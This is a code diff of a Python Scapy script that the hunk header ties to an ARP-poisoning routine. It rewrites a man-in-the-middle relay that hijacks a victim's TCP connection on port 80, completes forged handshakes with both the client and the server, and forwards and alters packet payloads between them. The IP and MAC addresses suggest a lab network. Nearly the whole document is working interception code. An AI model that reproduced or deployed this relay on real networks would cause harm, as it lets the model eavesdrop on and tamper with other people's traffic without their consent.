@@ -11,51 +11,67 @@ def ARPPoison(macAttacker, macVictim, ipToSpoof, ipVictim):
     sendp(arp)
 
 def forward(p):
-    if p.src = ipToSpoof:
-        print p.load
-        global seq, ack
-        tcpLayer = TCP(sport = 80, dport = port, flags = "PA", seq = seq, ack = ack, options = [('MSS', 1460)])
-        answer = sr1(ipLayerC / tcpLayer / p.load)
-        seq = answer.ack
-    else:
-        print p.load
+    print p.summary()
+    if p[IP].src == ipToSpoof:
+        ipLayerC.type = p.type
+        ipLayerC.version = p.version
+        ipLayerC.ihl = p.ihl
+        ipLayerC.tos = p.tos
+        ipLayerC.len = p.len
+        ipLayerC.id = p.id
+        ipLayerC.flags = p.flags
+        ipLayerC.frag = p.frag
+        ipLayerC.ttl = p.ttl
+        ipLayerC.proto = p.proto
+        send(ipLayerC / p[TCP])
+    elif p[IP].src == ipVictim:
+        ipLayerS.type = p.type
+        ipLayerS.version = p.version
+        ipLayerS.ihl = p.ihl
+        ipLayerS.tos = p.tos
+        ipLayerS.len = p.len
+        ipLayerS.id = p.id
+        ipLayerS.flags = p.flags
+        ipLayerS.frag = p.frag
+        ipLayerS.ttl = p.ttl
+        ipLayerS.proto = p.proto
+        try:
+            tcpLayer = p[TCP]
+            tcpLayer.load = tcpLayer.load.replace(ipSelf, ipToSpoof)
+            send(ipLayerS / tcpLayer)
+        except AttributeError:
+            send(ipLayerS / p[TCP])
         
 
 ipToSpoof = "192.168.56.102"
 ipSelf = "192.168.56.103"
+macSelf = "08:00:27:32:f4:6a"
+macVictim = "08:00:27:b0:a1:ab"
+
 print "Listening as " + ipSelf
 
-# TCP handshake with client
+# Start TCP handshake with client
 a = sniff(count = 1, filter = "tcp and port 80 and host " + ipSelf)
 ipVictim = a[0][IP].src
 port = a[0].sport
-seq = a[0].seq
-ack = a[0].seq + 1
 print "Connection from " + ipVictim + ":" + str(port)
-
-ipLayerC = IP(src = ipSelf, dst = ipVictim)
-synAck = TCP(sport = 80, dport = port, flags = "SA", seq = seq, ack = ack, options = [('MSS', 1460)])
-answer = sr1(ipLayerC / synAck)
-print "Handshake 1 completed"
-print "---------------------"
-
-# Forward and log http requests
-incRequest = sniff(count = 1, filter = "tcp and port 80")
-ack = ack + len(incRequest[0].load)
-seq = seq + 1
-print incRequest[0].load
 
 # TCP handshake with server
 ipLayerS = IP(src = ipSelf, dst = ipToSpoof)
-tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = 1000)
+tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq)
 answer = sr1(ipLayerS / tcpLayer)
 tcpLayer = TCP(sport = port, dport = 80, flags = "A", seq = answer.ack, ack = answer.seq + 1)
 send(ipLayerS / tcpLayer)
 print "Handshake 2 completed"
 print "---------------------"
 
-tcpLayer = TCP(sport = port, dport = 80, flags = incRequest[0][TCP].flags, seq = answer.ack, ack = answer.seq + 1)
-answer = sr1(ipLayerS / tcpLayer / incRequest[0].load)
+# Finish TCP handshake with client
+ipLayerC = IP(src = ipSelf, dst = ipVictim)
+synAck = TCP(sport = 80, dport = port, flags = "SA", seq = answer.seq, ack = a[0].seq + 1)
+print sr1(ipLayerC / synAck).summary()
+print "Handshake 1 completed"
+print "---------------------"
+
 sniff(filter = "tcp and host " + ipSelf, prn = forward)
 
 tcpLayer = TCP(sport = 80, dport = port, flags = "FA", seq = seq, ack = ack, options = [('MSS', 1460)])
